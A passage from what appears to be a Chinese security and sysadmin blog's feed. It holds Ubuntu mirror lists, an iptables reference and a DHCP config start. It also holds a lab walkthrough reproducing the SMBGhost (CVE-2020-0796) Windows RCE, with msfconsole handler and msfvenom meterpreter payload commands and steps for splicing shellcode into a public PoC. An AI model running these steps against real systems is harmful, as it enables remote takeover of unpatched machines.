        <content type="html"><![CDATA[<p>备份源文件 <code>sudo cp -p /etc/apt/sources.list /etc/apt/sources.list.bak_2020.10.13</code></p><p>在 <code>/etc/apt/sources.list</code> 文件最前行添加所需源即可</p><h2 id="阿里源"><a href="#阿里源" class="headerlink" title="阿里源"></a>阿里源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<br></code></pre></td></tr></table></figure><h2 id="中科大源"><a href="#中科大源" class="headerlink" title="中科大源"></a>中科大源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse<br>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse<br>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse<br>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse<br>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse<br>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse<br>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse<br>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse<br>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse<br></code></pre></td></tr></table></figure><h2 id="清华源"><a href="#清华源" class="headerlink" title="清华源"></a>清华源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse<br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse<br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse<br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse<br>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse<br>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse<br>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse<br>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse<br>deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse<br></code></pre></td></tr></table></figure><h2 id="163源"><a href="#163源" class="headerlink" title="163源"></a>163源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse<br>deb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse<br>deb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse<br>deb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse<br>deb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse<br>deb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse<br>deb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse<br>deb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse<br>deb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse<br></code></pre></td></tr></table></figure><p>更新缓存 <code>sudo apt-get update</code><br>安装更新 <code>sudo apt-get upgrade</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows：CVE-2020-0796 RCE 漏洞复现</title>
      <link href="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/Windows%EF%BC%9ACVE-2020-0796%20RCE/"/>
      <url>/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/Windows%EF%BC%9ACVE-2020-0796%20RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="一、影响范围（需关闭-Win10-防火墙）："><a href="#一、影响范围（需关闭-Win10-防火墙）：" class="headerlink" title="一、影响范围（需关闭 Win10 防火墙）："></a>一、影响范围（需关闭 Win10 防火墙）：</h2><ul><li>Windows 10 Version 1903 for 32-bit Systems</li><li>Windows 10 Version 1903 for ARM64-based Systems</li><li>Windows 10 Version 1903 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)<br></li></ul><hr><h2 id="二、漏洞复现："><a href="#二、漏洞复现：" class="headerlink" title="二、漏洞复现："></a>二、漏洞复现：</h2><p><strong>环境准备：</strong></p><ul><li>kali，ip：192.168.201.152（攻击机）</li><li>受影响版本的Win10，ip：192.168.201.132（须关闭防火墙）</li></ul><p><strong>漏洞检测工具下载地址：</strong></p><ul><li><p><a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p></li><li><ul><li><strong>漏洞检测工具使用方法：</strong></li></ul></li><li><ul><li><code>pythone3 scanner.py 192.168.0.0/24</code></li></ul></li></ul><p><strong>PoC下载地址：</strong></p><ul><li><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p></li><li><ul><li><strong>POC 使用方法：</strong></li></ul></li><li><ul><li><code>python3.8 exploit.py -ip 192.168.201.132</code><br></li></ul></li></ul><hr><h2 id="三、漏洞复现："><a href="#三、漏洞复现：" class="headerlink" title="三、漏洞复现："></a>三、漏洞复现：</h2><p>1、先对使用kali对 9999 端口进行监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfconsole<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set lport 9999<br>set rhost 192.168.201.132<br>run<br></code></pre></td></tr></table></figure><p><img src="1.png"></p><p>2、kali 使用 msf 生成木马（此处端口需跟监听的端口是一致的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -b &#x27;\x00&#x27; -i 1 -f python&gt;test.py<br></code></pre></td></tr></table></figure><p>木马生成后的内容为：<br><img src="2.png"></p><p>下载好的 POC：<br><img src="3.png"></p><p>3、先把木马的内的 buf 替换为 USER_PAYLOAD ，再替换 exploit.py 内的 USER_PAYLOAD 行的内容</p><ul><li>:set nu       &emsp;&emsp;&#x2F;&#x2F; 显示行</li><li>:91,127s&#x2F;buf&#x2F;USER_PAYLOAD    &emsp;&emsp;&#x2F;&#x2F; 把91-127行的 buf 替换为 USER_PAYLOAD</li></ul><p><img src="4.png"></p><p>4、使用 Python3 运行（在此处需按一次回车）<br><img src="5.png"><br>![](Windows：CVE-2020-0796 RCE&#x2F;6.png)</p><p>5、此时监听的 9999 端口已收到访反弹的 shell</p><ul><li>&#x2F;&#x2F; 如未收到反弹的 Shell 则使用 Python 重新运行一次 POC</li></ul><p><img src="7.png"><br>![](Windows：CVE-2020-0796 RCE&#x2F;8.png)</p><hr>]]></content>
      
      
      <categories>
          
          <category> Windows 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Iptables</title>
      <link href="/2021/02/09/Linux/iptables/iptables/"/>
      <url>/2021/02/09/Linux/iptables/iptables/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>netfilter/iptables</code>（简称 <code>iptables</code>）组成 Linux 平台下的包过滤防火墙</p><p><code>iptables</code> 组件是一种工具，也称为用户空间，它使插入、修改和除去信息包过滤表中的规则变得容易</p><p><code>netfilter</code> 组件也称为内核空间，是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集</p><p>安装 <code>iptables</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">yum -y install iptables iptables-services<br></code></pre></td></tr></table></figure><p>重启：<code>systemctl restart iptables</code><br>保存：<code>service iptables save</code></p><h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p>iptables + -t 表名 + 规则&#x2F;链管理参数 + 匹配参数 + 动作类型参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  选择表<br>-t#  对指定表进行操作（必须是 raw、nat、filter、mangle 中的一个。如没有指定则默认为 filter表）<br><br>#  规则管理<br>-A#  在指定规则链的末尾加入新规则<br>-I#  在指定规则链的头部加入新规则（默认在第一行添加）<br>-D#  删除指定链中的一条规则（可按规则序号和内容删除）<br>-R#  修改、替换指定链中的某一条规则（可按照规则序号和内容替换）<br><br>#  链管理<br>-P#  设置指定链默认策略 <br>-N#  新建一条用户自己定义的规则链<br>-X#  删除指定表中用户自定义的规则链<br>-E#  重命名用户定义的链（不改变链本身）<br>-Z#  将所有表的所有链的字节和数据包计数器清零<br><br>#  规则链<br>INPUT#  处理入站的数据包<br>OUTPUT#  处理出站的数据包<br>FORWARD#  处理转发的数据包<br>PREROUTING#  处理入站的路由规则<br>POSTROUTING#  处理出站的路由规则<br><br>#  匹配（加感叹号 “！“表示这个目标除外（加感叹号后需加空格后在加匹配项））<br>-s#  匹配来源地址 IP/MASK<br>-d#  匹配目标地址<br>-i#  网卡名称（匹配从这块网卡流入的数据）<br>-o#  网卡名称（匹配从这块网卡流出的数据）<br>-m#  使用扩展模块<br>-p#  匹配协议（如：tcp、udp、icmp）<br>tcp     #  扩展选项：--source-port （扩展选项可用 iptables -p tcp -h 查看）<br>udp     #  扩展选项：--source-port （扩展选项可用 iptables -p icmp -h 查看）<br>icmp    #  可用扩展：  --icmp-type  （可用扩展可用 iptables -p icmp -h 查看）<br>--dport 80#  匹配目标端口 80<br>--sport 81#  匹配来源端口 81<br><br>#  指定动作类型<br>-j  #  指定动作类型<br>    动作类型：<br>    ACCEPT#  允许数据包通过<br>    REJECT#  拒绝数据包通过（必要时会发送响应信息）<br>    DROP#  直接丢弃（不给出任何回应）<br>    QUEUE#  中断过滤程序，将封包放入队列，交由其它程序处理<br>    RETURN#  停止当前链中的后续规则，并返回到调用链（the calling chain）中<br>    REDIRECT#  在本机上做端口映射<br>    DNAT#  改变数据包的目的地址<br>    SNAT#  改变数据包的源地址<br>    MASQUERADE#  SNAT 的一种特殊形式，适用于动态、临时会变的 IP 上（只能用户 nat 表的 POSTROUTING 链）<br>    LOG    #  在 /var/log/messages 文件中记录日志信息，然后在将数据包传递给下一条规则<br><br>#  查看/清空 规则<br>-L#  列出指定链中所有的规则<br>-n#  IP地址和端口会一数字的形式打印<br>-v#  详细输出<br>-F#  清空规则链<br></code></pre></td></tr></table></figure><hr><h2 id="三、扩展模块"><a href="#三、扩展模块" class="headerlink" title="三、扩展模块"></a>三、扩展模块</h2><p>使用方法：<code>iptables + -m + 扩展模块名</code><br>可用扩展选项可用：<code>iptables + -m + 扩展名 + -h</code> 查看</p><h3 id="limit（速率限制）"><a href="#limit（速率限制）" class="headerlink" title="limit（速率限制）"></a>limit（速率限制）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  每分钟允许通过 5 个 icmp 包（默认为 3/小时，秒：/sec  分钟：/minute   小时：/hour  天：/day）<br>iptables -A INPUT -p icmp -m limit --limit 5/minute -j ACCEPT<br>#  每分钟允许通过 5 个 icmp 包，最多不超过 10 个<br>iptables -A INPUT -p icmp -m limit --limit 5/minute --limit-burst 10 -j ACCEPT<br></code></pre></td></tr></table></figure><h3 id="multiport（-多端口匹配）"><a href="#multiport（-多端口匹配）" class="headerlink" title="multiport（ 多端口匹配）"></a>multiport（ 多端口匹配）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  匹配 22，端口（最多可指定15个端口）<br>iptables -A INPUT -p tcp -m multiport --dport 22,80 -j ACCEPT<br></code></pre></td></tr></table></figure><h3 id="iprange（匹配指定范围内的地址）"><a href="#iprange（匹配指定范围内的地址）" class="headerlink" title="iprange（匹配指定范围内的地址）"></a>iprange（匹配指定范围内的地址）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  匹配指定范围内的地址<br>iptables -A INPUT -p tcp -m iprange --src-range 192.168.1.0-192.168.1.111 --dport 22 -j ACCEPT<br></code></pre></td></tr></table></figure><h3 id="string（字符串匹配）"><a href="#string（字符串匹配）" class="headerlink" title="string（字符串匹配）"></a>string（字符串匹配）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  当服务端返回数据报文检查到有关键字 “test&quot; 时，则丢弃该报文（能够检测到报文应用层中的字符串  注：该条规则需添加到 OUTPUT 链）<br>iptables -A OUTPUT -p tcp --dport 80 -m string --algo kmp --string &quot;test&quot; -j DROP<br></code></pre></td></tr></table></figure><h3 id="connlimit（连接数限制）"><a href="#connlimit（连接数限制）" class="headerlink" title="connlimit（连接数限制）"></a>connlimit（连接数限制）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  限制同一 IP 最多同时 10 个 http 连接<br>iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 10 -j REJECT<br>#  限制每组 C 类 IP 最多同时 10 个 http 连接<br>iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 10 --connlimit-mask 24 -j DROP<br>#  限制指定网段的 IP 最多同时 10 个 http 连接<br>iptables -A INPUT -s 192.168.1.0/24 -p tcp --syn --dport 80 -m connlimit --connlimit-above 10 -j REJECT<br></code></pre></td></tr></table></figure><h3 id="recent（时间限制）"><a href="#recent（时间限制）" class="headerlink" title="recent（时间限制）"></a>recent（时间限制）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">--name    #  设置列表名称<br>--resource#  源地址<br>--redest#  目的地址<br>--seconds#  指定时间内（单位：秒）<br>--hitcount#  匹配次数<br>--set#  将地址添加进列表，并更新信息（包含地址加入的时间戳）<br>--rcheck#  匹配列表中的源地址（以第一个匹配计算时间）<br>--update#  类似 rcheck（以最后一个匹配计算时间）<br>--remove#  在列表里删除相应地址（后面接列表名称及地址）<br><br>#  将访问的主机记录到 test 列表，并放行<br>iptables -A INPUT -p tcp --dport 80 --syn -m recent --name test --set -j ACCEPT<br>#  如访问的主机在 test 列表有记录则限制 80 端口 60 秒 内每个 IP 只能发起 20 个新的连接，超过则记录日志（日志前缀为 DDOS:）<br>iptables -A INPUT -p tcp --dport 80 --syn -m recent --name test --rcheck --seconds 60 --hitcount 20 -j LOG --log-prefix &#x27;DDOS:&#x27; --log-ip-options<br>#  如访问的主机在 test 列表有记录则限制 80 端口 60 秒 内每个 IP 只能发起 20 个新的连接，超过则丢包<br>iptables -A INPUT -p tcp --dport 80 --syn -m recent --name test --rcheck --seconds 60 --hitcount 20 -j DROP<br></code></pre></td></tr></table></figure><h3 id="state（状态检查）"><a href="#state（状态检查）" class="headerlink" title="state（状态检查）"></a>state（状态检查）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">NEW：新建立一个会话<br>ESTABLISHED：已建立的连接<br>RELATED：有关联关系的连接<br>INVALID：无法识别的连接<br><br>#  放行 ssh 的首次连接状态<br>iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT<br>#  放行有关联的连接跟已建立的连接<br>iptables -A INPUT -m state --state  RELATED,ESTABLISHED -j ACCEPT<br></code></pre></td></tr></table></figure><hr><h2 id="四、规则表和规则链"><a href="#四、规则表和规则链" class="headerlink" title="四、规则表和规则链"></a>四、规则表和规则链</h2><h3 id="规则表（tables）"><a href="#规则表（tables）" class="headerlink" title="规则表（tables）"></a>规则表（tables）</h3><p>规则表提供特定的功能（内置了4个表），类似用户组，每个组都有不同的功能，并且都有对应的用户（规则链）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">filter#  负责过滤功能（内核模块：iptables_filter）<br>nat     #  负责网络地址转换功能（内核模块：iptable_nat）<br>mangle#  拆解、修改、封装报文（内核模块；iptable_mangle）<br>raw     #  决定数据包是否被状态跟踪机制处理内核（内核模块：iptable_raw）<br></code></pre></td></tr></table></figure><p>规则表优先顺序（从左往右）：<code>raw  &lt;---  mangle  &lt;---  nat  &lt;---  filter</code></p><p>规则表对应的规则链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">raw 表：PREOUTING、OUTPUT<br>mangle 表：PREROUTING、INPUT、FORWARD、OUTPUT、POSTROUTING<br>nat 表：PREROUTING、INPUT、OUTPUT、POSTROUTING<br>filter 表：INTPUT、FORWARD、OUTPUT<br></code></pre></td></tr></table></figure><p><img src="iptables.png"></p><h3 id="规则链（chains）"><a href="#规则链（chains）" class="headerlink" title="规则链（chains）"></a>规则链（chains）</h3><p>规则链是规则的集合。对特定的数据包设置相应的规则（读取规则链时是按照从上往下的顺序）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">INPUT#  处理入站的数据包<br>OUTPUT#  处理出站的数据包<br>FORWARD     #  处理转发的数据包<br>PREROUTING#  数据包进入路由表前<br>POSTROUTING#  数据包进入路由表后<br></code></pre></td></tr></table></figure><p>入站顺序（从左往右）：<code>PREROUTING  &lt;---  INPUT</code><br>出站顺序（从左往右）：<code>OUTPUT  &lt;---   POSTROUTING</code><br>转发顺序（从左往右）：<code>PREROUTING  &lt;---  FORWARD  &lt;---  POSTROUTING</code></p><h2 id="五、实例"><a href="#五、实例" class="headerlink" title="五、实例"></a>五、实例</h2><h3 id="查看-删除-规则"><a href="#查看-删除-规则" class="headerlink" title="查看&#x2F;删除 规则"></a>查看&#x2F;删除 规则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">iptables -L             #  列出所有规则<br>iptables -L -nv    #  查看详细信息（IP 跟 端口会以数字形式显示）<br>iptables -t nat -L      #  列出 nat 表中的所有规则<br>iptables -t nat -L -nv  #  查看详细信息（IP 跟 端口会以数字形式显示）<br>iptables -F             #  清除所有规则（如不指定表，则默认表为 filter）<br>iptables -t nat -D INPUT 1  #  删除 nat 表 INPUT 链下的第一条规则<br></code></pre></td></tr></table></figure><h3 id="在指定表中新建规则（如不指定，则默认为-filter-表）"><a href="#在指定表中新建规则（如不指定，则默认为-filter-表）" class="headerlink" title="在指定表中新建规则（如不指定，则默认为 filter 表）"></a>在指定表中新建规则（如不指定，则默认为 filter 表）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  在 nat 表中开放 80 端口<br>iptables -t nat -A INPUT -p tcp --dport 80 -j ACCEPT<br></code></pre></td></tr></table></figure><h3 id="设置白名单"><a href="#设置白名单" class="headerlink" title="设置白名单"></a>设置白名单</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  允许 192.168.1.0/24 网段的主机访问<br>iptables -A INPUT -p all -s 192.168.1.0/24 -j ACCEPT<br><br>#  允许 192.168.2.0/24 网段的主机访问本机的 80 端口<br>iptables -A INPUT -p all -s 192.168.2.0/24 --dport 80 -j ACCEPT<br></code></pre></td></tr></table></figure><h3 id="指定范围"><a href="#指定范围" class="headerlink" title="指定范围"></a>指定范围</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  指定 IP 范围<br>iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE<br>#  指定端口范围<br>iptables -t nat -A INPUT -p tcp --dport 90:100 -j ACCEPT<br></code></pre></td></tr></table></figure><h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  当别的主机访问本地 80 端口时会被重定向到 8080 端口<br>iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080<br></code></pre></td></tr></table></figure><h3 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  禁 Ping<br>iptables -A INPUT -p icmp -j DROP<br>#  禁 Ping<br>iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROP<br>#  禁止 MAC 地址为 00:11:22:33:44:55 的主机访问<br>iptables -A INPUT -m mac --mac-source 00:11:22:33:44:55 -j DROP<br>#  禁止转发 MAC 地址为 00:11:22:33:44:55 的主机的数据<br>iptables -A FORWARD -m mac --mac-source 00:11:22:33:44:55 -j DROP<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DHCP/DHCP/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DHCP/DHCP/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>DHCP（动态主机配置协议）是一个局域网的网络协议。为主机分配 IP 地址。</p><p>安装：<code>yum -y install dhcp</code><br>默认端口：<code>67/68</code><br>主配置文件：<code>/etc/dhcp/dhcpd.conf</code><br>模板文件：<code>/usr/share/doc/dhcp-4.2.5/dhcpd.conf.example</code><br>执行程序：<code>/usr/sbin/dhcpd、/usr/sbin/dhcrelay</code><br>执行参数配置：<code>/etc/sysconfig/dhcpd</code><br>查看租约文件：<code>/var/lib/dhcpd/dhcpd.lease</code><br>网络服务的排错日志：<code>/var/log/messages</code></p><h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">log-facility local7;    #  指定日志文件<br>ddns-update-style none; #  设置 DNS 的更新方式（可用参数：standard、interim、none）<br>ignore client-updates;  #  不允许客户端更新 DNS 记录<br><br><br>subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网<br>  range 192.168.1.1 192.168.1.253;    #  设置范围<br>  option domain-name-servers 114.114.114.114;#  设置 DNS<br>  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域<br>  option routers 192.168.1.254;       #  设置网关<br>  option broadcast-address 192.168.1.255;#  设置广播地址<br>  default-lease-time 600; #  默认租期（单位：秒）<br>  max-lease-time 7200;    #  最大租期（单位：秒）<br>&#125;<br><br>host fantasia &#123;<br>  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址<br>  fixed-address 192.168.1.111;          #  设置为其分配的保留 